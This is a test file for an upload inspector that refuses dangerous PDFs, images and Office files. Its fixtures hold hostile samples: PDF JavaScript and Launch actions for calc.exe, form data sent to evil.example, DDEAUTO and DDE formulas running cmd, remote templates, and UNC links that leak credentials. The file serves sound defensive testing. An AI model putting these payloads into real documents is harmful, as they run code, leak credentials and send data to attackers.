import { afterAll, describe, expect, it } from 'vitest';
import { PDFDocument, PDFName, PDFString } from 'pdf-lib';
import { detectType } from '../src/documents/content-check.js';
import { INSPECTOR_LIMITS, inspectUpload, stopInspector } from '../src/documents/content-inspector.js';
import { looksLikeZip, ZIP_LIMITS } from '../src/documents/zip-inspect.js';
import * as B from './fixtures/hostile/build.js';
import { PDF } from './helpers.js';

// The adversarial upload corpus (THREATS.md C1-C8). Each case is built from
// readable source in fixtures/hostile/build.ts. Cases that one layer alone
// catches assert that layer's own message, so removing the layer fails a
// test even though a later layer might have refused the file anyway.

const refused = async (buf: Buffer, name: string): Promise<string> => {
  try {
    const t = await detectType(buf, name);
    return `ACCEPTED as ${t.ext}`;
  } catch (err) {
    return (err as Error).message;
  }
};
const accepted = async (buf: Buffer, name: string) => (await detectType(buf, name)).ext;

const JS_ACTION = '<</S/JavaScript/JS(app.alert(1))>>';
/** One object stream holding `body` as object 5, referenced from the catalog or a page. */
const compressed = (body: string, where: { catalogExtra?: string; pageExtra?: string }) =>
  B.pdf({ ...where, extra: [B.objStm(4, [{ num: 5, body }])] });

afterAll(() => stopInspector());

describe('PDF: the raw-bytes passes', () => {
  it('first pass: a plain /JavaScript action is refused on sight', async () => {
    expect(await refused(B.pdf({ catalogExtra: `/OpenAction${JS_ACTION}` }), 'a.pdf'))
      .toBe('PDFs containing JavaScript, launch actions or embedded files are not accepted');
  });

  it('second pass: names written with #xx escapes (/J#61vaScript, lower-case hex too)', async () => {
    for (const name of ['/J#61vaScript', '/#4aavaScript', '/L#61unch', '/Emb#65ddedFile', '/#58FA']) {
      const msg = await refused(B.pdf({ catalogExtra: `/Foo ${name}` }), 'a.pdf');
      expect(msg, name).toBe('PDFs containing JavaScript, launch actions or embedded files are not accepted (names written with #xx escapes)');
    }
  });

  it('refuses truncated PDFs and PDFs with anything appended after %%EOF', async () => {
    const good = B.pdf();
    const truncated = good.subarray(0, good.length - 40);
    expect(await refused(truncated, 'a.pdf')).toBe('The PDF is truncated or has data appended after its end');
    expect(await refused(B.pdf({ trailing: '<html><script>alert(1)</script></html>' }), 'a.pdf')).toBe('The PDF is truncated or has data appended after its end');
    expect(await refused(B.pdf({ trailing: 'x'.repeat(2000) }), 'a.pdf')).toBe('The PDF is truncated or has data appended after its end');
    // Whitespace after %%EOF is normal.
    expect(await accepted(B.pdf({ trailing: '\r\n\n  ' }), 'a.pdf')).toBe('pdf');
  });

  it('refuses a PDF that is also a ZIP (polyglot)', async () => {
    // A ZIP whose central directory sits inside the PDF body, with the
    // EOCD within the last 64 KB, is still a ZIP to unzip/Office.
    const inner = B.zip([{ name: 'evil.txt', data: 'x' }]);
    const p = B.pdf({ extra: [B.streamObj(4, '', inner)] });
    expect(await refused(p, 'a.pdf')).toBe('Files that are also ZIP archives (polyglots) are not accepted');
  });
});

describe('PDF: structural inspection (pdf-lib, inside compressed object streams)', () => {
  const cases: [string, Buffer, string][] = [
    ['OpenAction JavaScript in an object stream', compressed(JS_ACTION, { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing JavaScript are not accepted'],
    ['Launch action in an object stream', compressed('<</S/Launch/F(calc.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing launch actions are not accepted'],
    ['Launch with a lower-case hex-escaped name, compressed', compressed('<</S/#4caunch/F(cmd.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing launch actions are not accepted'],
    ['page additional action (AA) with JavaScript', compressed(`<</O ${JS_ACTION}>>`, { pageExtra: '/AA 5 0 R' }), 'PDFs containing JavaScript are not accepted'],
    ['annotation AA with JavaScript', compressed(`<</Type/Annot/Subtype/Widget/Rect[0 0 10 10]/AA<</E ${JS_ACTION}>>>>`, { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing JavaScript are not accepted'],
    ['form field calculate action', compressed(`<</FT/Tx/T(f)/AA<</C ${JS_ACTION}>>>>`, { catalogExtra: '/AcroForm<</Fields[5 0 R]>>' }), 'PDFs containing JavaScript are not accepted'],
    ['document-level Names JavaScript tree', compressed('<</JavaScript<</Names[(x) 6 0 R]>>>>', { catalogExtra: '/Names 5 0 R' }), 'PDFs containing JavaScript are not accepted'],
    ['XFA form', compressed('<</Fields[]/XFA 6 0 R>>', { catalogExtra: '/AcroForm 5 0 R' }), 'PDFs containing XFA forms are not accepted'],
    ['EmbeddedFiles name tree', compressed('<</EmbeddedFiles<</Names[]>>>>', { catalogExtra: '/Names 5 0 R' }), 'PDFs containing embedded files are not accepted'],
    ['FileAttachment annotation', compressed('<</Type/Annot/Subtype/FileAttachment/Rect[0 0 1 1]/FS<</Type/Filespec/F(a.exe)>>>>', { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing embedded files are not accepted'],
    ['RichMedia annotation', compressed('<</Type/Annot/Subtype/RichMedia/Rect[0 0 1 1]>>', { pageExtra: '/Annots[5 0 R]' }), 'PDFs containing active content (RichMedia) are not accepted'],
    ['GoToR remote go-to', compressed('<</S/GoToR/F(\\\\\\\\attacker\\\\share\\\\x.pdf)/D[0/Fit]>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing active content (GoToR) are not accepted'],
    ['SubmitForm (sends form data away)', compressed('<</S/SubmitForm/F<</FS/URL/F(https://evil.example/)>>>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs containing active content (SubmitForm) are not accepted'],
    ['URI action to file://', compressed('<</S/URI/URI(file:///C:/Windows/System32/calc.exe)>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs with links to local files or other non-web addresses are not accepted'],
    ['URI action to a UNC path (hex string)', compressed('<</S/URI/URI<5c5c6576696c5c73>>>', { catalogExtra: '/OpenAction 5 0 R' }), 'PDFs with links to local files or other non-web addresses are not accepted'],
    ['an action in an unreferenced object (orphan)', compressed(JS_ACTION, {}), 'PDFs containing JavaScript are not accepted'],
  ];
  for (const [name, buf, msg] of cases) {
    it(`refuses: ${name}`, async () => {
      // The raw bytes really are clean: only the structure gives it away.
      expect(/JavaScript|Launch|XFA|EmbeddedFile|RichMedia|GoToR|SubmitForm|file:/.test(buf.toString('latin1'))).toBe(false);
      expect(await refused(buf, 'x.pdf')).toBe(msg);
    });
  }

  it('an older revision of an object is inspected too (incremental update hides nothing)', async () => {
    // Object 5 is defined twice; the later, clean copy replaces it for
    // pdf-lib, but a viewer following the first xref would load the first.
    const p = B.pdf({ extra: [B.objStm(4, [{ num: 5, body: '<</S/Launch/F(calc.exe)>>' }]), Buffer.from('5 0 obj\n<</Clean true>>\nendobj\n', 'latin1')] });
    expect(await refused(p, 'x.pdf')).toBe('PDFs containing launch actions are not accepted');
  });

  it('refuses an object hidden inside another object\'s stream data', async () => {
    // A viewer that rebuilds the xref by scanning for "N G obj" finds it;
    // a parser that skips stream data does not. Nothing in it trips the regexes.
    const hidden = Buffer.from('9 0 obj <</S/URI/URI(file:///etc/passwd)>> endobj', 'latin1');
    const p = B.pdf({ extra: [B.streamObj(4, '', hidden)] });
    expect(await refused(p, 'x.pdf')).toBe('The PDF has objects hidden inside other objects and cannot be checked');
  });

  it('refuses a compressed stream that expands past the limit (stream zip bomb)', async () => {
    const p = B.pdf({ extra: [B.bombObjStm(4, 40 * 1024 * 1024)] });
    expect(p.length).toBeLessThan(200 * 1024);
    expect(await refused(p, 'x.pdf')).toBe('The PDF has a compressed stream that expands beyond the limit');
  });

  it('the limits apply only inside the check: other pdf-lib users in the process are unaffected', async () => {
    const p = B.pdf({ extra: [B.bombObjStm(4, 40 * 1024 * 1024)] });
    expect(await refused(p, 'x.pdf')).toBe('The PDF has a compressed stream that expands beyond the limit');
    // The same bytes through pdf-lib directly (as download stamping would) decode in full.
    await expect(PDFDocument.load(p, { throwOnInvalidObject: false })).resolves.toBeDefined();
  });

  it('refuses encrypted PDFs (their streams cannot be inspected)', async () => {
    expect(await refused(B.pdf({ trailerExtra: '/Encrypt<</Filter/Standard/V 2/R 3/O(x)/U(y)/P -4>>' }), 'x.pdf'))
      .toBe('Encrypted PDFs cannot be checked; remove the password and upload again');
  });

  it('refuses malformed structure (fail closed)', async () => {
    expect(await refused(Buffer.from('%PDF-1.7\n1 0 obj\n<</Type/Catalog/Pages 2 0 R\nendobj\n%%EOF\n', 'latin1'), 'x.pdf'))
      .toBe('The PDF is damaged or malformed and cannot be checked');
    expect(await refused(Buffer.from('%PDF-1.7\n%%EOF\n', 'latin1'), 'x.pdf')).toBe('The PDF is damaged or malformed and cannot be checked');
    // An object stream with a filter the parser cannot decode.
    const odd = B.pdf({ extra: [B.streamObj(4, '/Type/ObjStm/N 1/First 4/Filter/JBIG2Decode', Buffer.from('garbage'))] });
    expect(await refused(odd, 'x.pdf')).toBe('The PDF is damaged or malformed and cannot be checked');
  });

  it('refuses huge object counts', async () => {
    const many = Array.from({ length: 200_001 }, (_, i) => ({ num: 10 + i, body: 'null' }));
    const p = B.pdf({ extra: [B.objStm(4, many)] });
    expect(await refused(p, 'x.pdf')).toBe('The PDF has too many objects to check');
  }, 60_000);

  it('accepts ordinary PDFs: links to web pages, internal go-to, compressed object and xref streams', async () => {
    expect(await accepted(PDF, 'a.pdf')).toBe('pdf');
    expect(await accepted(B.pdf(), 'a.pdf')).toBe('pdf');
    expect(await accepted(B.pdf({ noXref: true }), 'a.pdf')).toBe('pdf');
    expect(await accepted(compressed('<</Type/Annot/Subtype/Link/Rect[0 0 1 1]/A<</S/URI/URI(https://example.com/)>>>>', { pageExtra: '/Annots[5 0 R]' }), 'a.pdf')).toBe('pdf');
    expect(await accepted(compressed('<</S/GoTo/D[3 0 R/Fit]>>', { catalogExtra: '/OpenAction 5 0 R' }), 'a.pdf')).toBe('pdf');
    // A real writer: pdf-lib with object streams and a cross-reference stream.
    const doc = await PDFDocument.create();
    const page = doc.addPage([300, 300]);
    page.drawText('Quarterly report');
    doc.setTitle('Report');
    const bytes = Buffer.from(await doc.save({ useObjectStreams: true }));
    expect(await accepted(bytes, 'r.pdf')).toBe('pdf');
  });

  it('a pdf-lib document with a JavaScript action added is refused', async () => {
    const doc = await PDFDocument.create();
    doc.addPage();
    const action = doc.context.obj({ S: 'JavaScript', JS: PDFString.of('app.alert(1)') });
    doc.catalog.set(PDFName.of('OpenAction'), doc.context.register(action));
    const bytes = Buffer.from(await doc.save({ useObjectStreams: true }));
    expect(bytes.toString('latin1')).not.toContain('/JavaScript');
    expect(await refused(bytes, 'x.pdf')).toBe('PDFs containing JavaScript are not accepted');
  });
});

describe('images: structure and polyglots', () => {
  it('accepts well-formed PNG and JPEG', async () => {
    expect(await accepted(B.png(), 'a.png')).toBe('png');
    expect(await accepted(B.jpeg(), 'a.jpg')).toBe('jpg');
    // Phones append data (motion-photo video) after the JPEG end marker.
    expect(await accepted(Buffer.concat([B.jpeg(), Buffer.from('\0\0\0\x18ftypmp42 motion photo video bytes', 'latin1')]), 'a.jpg')).toBe('jpg');
  });

  it('refuses a PNG with HTML after IEND, a corrupt chunk, or a missing IEND', async () => {
    expect(await refused(Buffer.concat([B.png(), Buffer.from('<html><script>alert(1)</script>')]), 'a.png')).toBe('The PNG image is damaged or has data appended after its end');
    const corrupt = B.png();
    corrupt[corrupt.length - 20] = corrupt[corrupt.length - 20]! ^ 0xff;
    expect(await refused(corrupt, 'a.png')).toBe('The PNG image is damaged or has data appended after its end');
    expect(await refused(B.png().subarray(0, B.png().length - 12), 'a.png')).toBe('The PNG image is damaged or has data appended after its end');
  });

  it('refuses a PNG whose text chunk carries HTML', async () => {
    expect(await refused(B.png([['tEXt', Buffer.from('Comment\0<script>alert(1)</script>', 'latin1')]]), 'a.png')).toBe('Images containing HTML or script are not accepted');
  });

  it('refuses a JPEG with a script appended, or in a comment', async () => {
    expect(await refused(Buffer.concat([B.jpeg(), Buffer.from('<script>alert(document.domain)</script>')]), 'a.jpg')).toBe('Images containing HTML or script are not accepted');
    expect(await refused(B.jpeg({ comment: '<svg onload=alert(1)>' }), 'a.jpg')).toBe('Images containing HTML or script are not accepted');
  });

  it('refuses a truncated JPEG', async () => {
    const j = B.jpeg();
    expect(await refused(j.subarray(0, 30), 'a.jpg')).toBe('The JPEG image is damaged');
  });

  it('refuses images that are also ZIPs or PDFs', async () => {
    const z = B.zip([{ name: 'a.txt', data: 'x' }]);
    expect(await refused(Buffer.concat([B.jpeg(), z]), 'a.jpg')).toBe('Files that are also ZIP archives (polyglots) are not accepted');
    const withPdf = B.png([['tEXt', Buffer.from('c\0%PDF-1.7 1 0 obj', 'latin1')]]);
    expect(await refused(withPdf, 'a.png')).toBe('Files that are also PDFs (polyglots) are not accepted');
  });

  it('refuses text that is also a PDF', async () => {
    expect(await refused(Buffer.from('hello\n%PDF-1.4\n1 0 obj<<>>endobj\n'), 'a.txt')).toBe('Files that are also PDFs (polyglots) are not accepted');
  });

  it('the ZIP detector sees a directory at the end of any file', () => {
    expect(looksLikeZip(Buffer.concat([Buffer.from('GIF89a'), B.zip([{ name: 'x', data: 'y' }])]))).toBe(true);
    expect(looksLikeZip(B.png())).toBe(false);
  });
});

describe('ZIP structure (Office files)', () => {
  const files = (): B.ZipFile[] => [
    { name: '[Content_Types].xml', data: '<Types/>' },
    { name: 'word/document.xml', data: '<w:document/>' },
  ];
  const cases: [string, Buffer, string][] = [
    ['local header name differs from the central directory', B.zip(files(), { localName: { 'word/document.xml': 'word/documenX.xml' } }), 'local header name disagrees with central directory'],
    ['duplicate entry names', B.zip([...files(), { name: 'word/document.xml', data: '<x/>' }]), 'duplicate entry name'],
    ['duplicate names differing only in case', B.zip([...files(), { name: 'WORD/document.xml', data: '<x/>' }]), 'duplicate entry name'],
    ['a directory entry pointing at another entry\'s local header', B.zip([...files(), { name: 'word/other.xml', data: '<w:document/>' }], { pointAt: { 'word/other.xml': 'word/document.xml' } }), 'local header name disagrees with central directory'],
    ['entries whose data overlap (overlapping-entry zip bomb)', B.zip(files(), { declaredComp: { '[Content_Types].xml': 40 } }), 'overlapping entries'],
    ['data hidden in a gap between entries', B.zip(files(), { gapAfter: { '[Content_Types].xml': Buffer.from('<html><script>alert(1)</script></html>') } }), 'unaccounted data between entries'],
    ['data appended after the archive', B.zip(files(), { trailing: Buffer.from('<script>alert(1)</script>') }), 'data after the end of the archive'],
    ['declared size smaller than the real data', B.zip(files(), { declaredSize: { 'word/document.xml': 3 } }), 'part word/document.xml is corrupt or larger than declared'],
    ['declared ratio of a zip bomb', B.zip([...files(), { name: 'word/big.xml', data: Buffer.alloc(2 * 1024 * 1024) }]), 'compression ratio too high (zip bomb)'],
    ['encrypted entry', B.zip(files(), { flags: { 'word/document.xml': 1 } }), 'encrypted entry'],
    ['entry count in the end record differs', B.zip(files(), { eocdEntries: 3 }), 'central directory entry malformed'],
  ];
  for (const [name, buf, why] of cases) {
    it(`refuses: ${name}`, async () => {
      expect(await refused(buf, 'x.docx')).toBe(`The file is not a valid Office document (${why})`);
    });
  }

  it('refuses more entries than the limit', async () => {
    const many = Array.from({ length: ZIP_LIMITS.maxEntries + 1 }, (_, i) => ({ name: `word/media/p${i}.xml`, data: '', store: true }));
    expect(await refused(B.zip([...files(), ...many]), 'x.docx')).toBe('The file is not a valid Office document (too many entries)');
  });

  it('accepts data descriptors that agree with the directory', async () => {
    expect(await accepted(B.docx({}, { descriptors: true }), 'x.docx')).toBe('docx');
  });

  it('refuses a ZIP with a PDF at the front (PDF polyglot)', async () => {
    expect(await refused(B.docx({ extra: [{ name: 'a.xml', data: '%PDF-1.4 hidden', store: true }] }), 'x.docx')).toBe('Files that are also PDFs (polyglots) are not accepted');
  });
});

describe('Office active content', () => {
  const cases: [string, Buffer, string, RegExp][] = [
    ['remote template (attachedTemplate, external)', B.docx({ docRels: B.relationship('rId9', 'attachedTemplate', 'https://evil.example/t.dotm', true) }), 'x.docx', /remote templates/],
    ['external OLE object relationship', B.docx({ docRels: B.relationship('rId9', 'oleObject', 'file:///C:/x.bin', true) }), 'x.docx', /OLE objects/],
    ['linked external image (web beacon / NTLM leak)', B.docx({ docRels: B.relationship('rId9', 'image', '\\\\attacker\\share\\a.png', true) }), 'x.docx', /external content/],
    ['subDocument from a network share', B.docx({ docRels: B.relationship('rId9', 'subDocument', 'file://attacker/share/a.docx', true) }), 'x.docx', /external content/],
    ['external hyperlink to file://', B.docx({ docRels: B.relationship('rId9', 'hyperlink', 'file:///C:/Windows/System32/calc.exe', true) }), 'x.docx', /local files or network shares/],
    ['external hyperlink to a UNC path', B.docx({ docRels: B.relationship('rId9', 'hyperlink', '\\\\attacker\\share', true) }), 'x.docx', /local files or network shares/],
    ['TargetMode spelled with an entity', B.docx({ docRels: '<Relationship Id="r" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://e/t" TargetMode="&#69;xternal"/>' }), 'x.docx', /remote templates/],
    ['OLE object in word/embeddings', B.docx({ extra: [{ name: 'word/embeddings/oleObject1.bin', data: Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]) }] }), 'x.docx', /OLE objects/],
    ['executable disguised as an embedded workbook', B.docx({ extra: [{ name: 'word/embeddings/Sheet.xlsx', data: Buffer.from('MZ\x90\0') }] }), 'x.docx', /OLE objects/],
    ['macro-enabled workbook nested inside a chart', B.pptx({ extra: [{ name: 'ppt/embeddings/Chart.xlsx', data: B.xlsx({ extra: [{ name: 'xl/vbaProject.bin', data: 'x' }] }) }] }), 'x.pptx', /Macro-enabled/],
    ['ActiveX control', B.docx({ extra: [{ name: 'word/activeX/activeX1.xml', data: '<ax:ocx/>' }] }), 'x.docx', /ActiveX/],
    ['ActiveX relationship', B.pptx({ slideRels: B.relationship('rId2', 'control', '../activeX/activeX1.xml').replace('/control"', '/activeXControlBinary"') }), 'x.pptx', /ActiveX/],
    ['VBA project', B.docx({ extra: [{ name: 'word/vbaProject.bin', data: 'x' }] }), 'x.docx', /Macro-enabled/],
    ['macro-enabled content type', B.docx({ contentTypes: 'application/vnd.ms-word.document.macroEnabled.main+xml' }), 'x.docx', /Macro-enabled/],
    ['Excel 4.0 macro sheet', B.xlsx({ extra: [{ name: 'xl/macrosheets/sheet1.xml', data: '<xm:macrosheet/>' }] }), 'x.xlsx', /macro sheets/],
    ['DDEAUTO field', B.docx({ body: '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>' }), 'x.docx', /DDE fields/],
    ['DDE field split across runs', B.docx({ body: '<w:p><w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText>E cmd "/c calc"</w:instrText></w:r></w:p>' }), 'x.docx', /DDE fields/],
    ['DDE in a simple field', B.docx({ body: '<w:p><w:fldSimple w:instr=" DDEAUTO cmd &quot;/c calc&quot; "/></w:p>' }), 'x.docx', /DDE fields/],
    ['INCLUDEPICTURE from a network share', B.docx({ body: '<w:p><w:r><w:instrText> INCLUDEPICTURE "\\\\\\\\attacker\\\\s\\\\a.png" \\d </w:instrText></w:r></w:p>' }), 'x.docx', /external files/],
    ['xlsx external workbook link', B.xlsx({ extra: [{ name: 'xl/externalLinks/externalLink1.xml', data: '<externalLink><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>' }] }), 'x.xlsx', /linked to external files/],
    ['xlsx DDE formula', B.xlsx({ sheet: '<row r="1"><c r="A1"><f>cmd|\'/c calc\'!A0</f></c></row>' }), 'x.xlsx', /DDE formulas/],
    ['DOCTYPE in a part (entities could hide content)', B.docx({ body: '<w:p/>' }).length ? B.docx({ extra: [{ name: 'word/x.xml', data: '<!DOCTYPE x [<!ENTITY e "DDEAUTO">]><x>&e;</x>' }] }) : Buffer.alloc(0), 'x.docx', /document type declarations/],
  ];
  for (const [name, buf, file, msg] of cases) {
    it(`refuses: ${name}`, async () => {
      expect(await refused(buf, file)).toMatch(msg);
    });
  }

  it('accepts ordinary Office files: web hyperlinks, mailto, a chart workbook, normal formulas', async () => {
    expect(await accepted(B.docx({ docRels: B.relationship('rId9', 'hyperlink', 'https://example.com/a?b=c', true) + B.relationship('rId8', 'hyperlink', 'mailto:a@b.c', true) }), 'a.docx')).toBe('docx');
    expect(await accepted(B.pptx({ extra: [{ name: 'ppt/embeddings/Microsoft_Excel_Worksheet.xlsx', data: B.xlsx() }] }), 'a.pptx')).toBe('pptx');
    expect(await accepted(B.xlsx({ sheet: '<row r="1"><c r="A1"><f>SUM(B1:B9)</f></c><c r="A2"><f>Sheet2!A1*2</f></c></row>' }), 'a.xlsx')).toBe('xlsx');
    expect(await accepted(B.docx({ body: '<w:p><w:r><w:instrText> PAGE </w:instrText></w:r></w:p>' }), 'a.docx')).toBe('docx');
  });
});

describe('the worker pool: isolation and limits', () => {
  it('checks files off the main thread; the API thread keeps running during a heavy check', async () => {
    const many = Array.from({ length: 150_000 }, (_, i) => ({ num: 10 + i, body: '<</A[1 2 3]/B(x)>>' }));
    const heavy = B.pdf({ extra: [B.objStm(4, many)] });
    let ticks = 0;
    const timer = setInterval(() => { ticks++; }, 5);
    const t0 = Date.now();
    expect((await inspectUpload(heavy, 'heavy.pdf')).ext).toBe('pdf');
    const elapsed = Date.now() - t0;
    clearInterval(timer);
    // The main thread was free: the timer fired at a steady rate throughout.
    expect(ticks).toBeGreaterThan(elapsed / 5 / 4);
  }, 60_000);

  it('a file that takes too long is refused and its worker replaced', async () => {
    const saved = INSPECTOR_LIMITS.timeoutMs;
    INSPECTOR_LIMITS.timeoutMs = 1;
    try {
      await expect(inspectUpload(B.pdf(), 'slow.pdf')).rejects.toThrow('The file took too long to check and was not accepted');
    } finally {
      INSPECTOR_LIMITS.timeoutMs = saved;
    }
    expect((await inspectUpload(B.pdf(), 'next.pdf')).ext).toBe('pdf');
  });

  it('a file that exhausts the worker heap is refused, and the next file is checked normally', async () => {
    const saved = INSPECTOR_LIMITS.heapMb;
    await stopInspector();
    INSPECTOR_LIMITS.heapMb = 24;
    try {
      const many = Array.from({ length: 190_000 }, (_, i) => ({ num: 10 + i, body: '<</A[1 2 3 4 5 6 7 8]/B(xxxxxxxxxxxxxxxx)/C<</D 1>>>>' }));
      await expect(inspectUpload(B.pdf({ extra: [B.objStm(4, many)] }), 'big.pdf')).rejects.toThrow('The file needs too much memory to check and was not accepted');
    } finally {
      INSPECTOR_LIMITS.heapMb = saved;
      await stopInspector();
    }
    expect((await inspectUpload(B.pdf(), 'next.pdf')).ext).toBe('pdf');
  }, 60_000);

  it('refusals inside the worker come back as refusals, not crashes', async () => {
    await expect(inspectUpload(compressed(JS_ACTION, { catalogExtra: '/OpenAction 5 0 R' }), 'x.pdf')).rejects.toThrow('PDFs containing JavaScript are not accepted');
  });
});
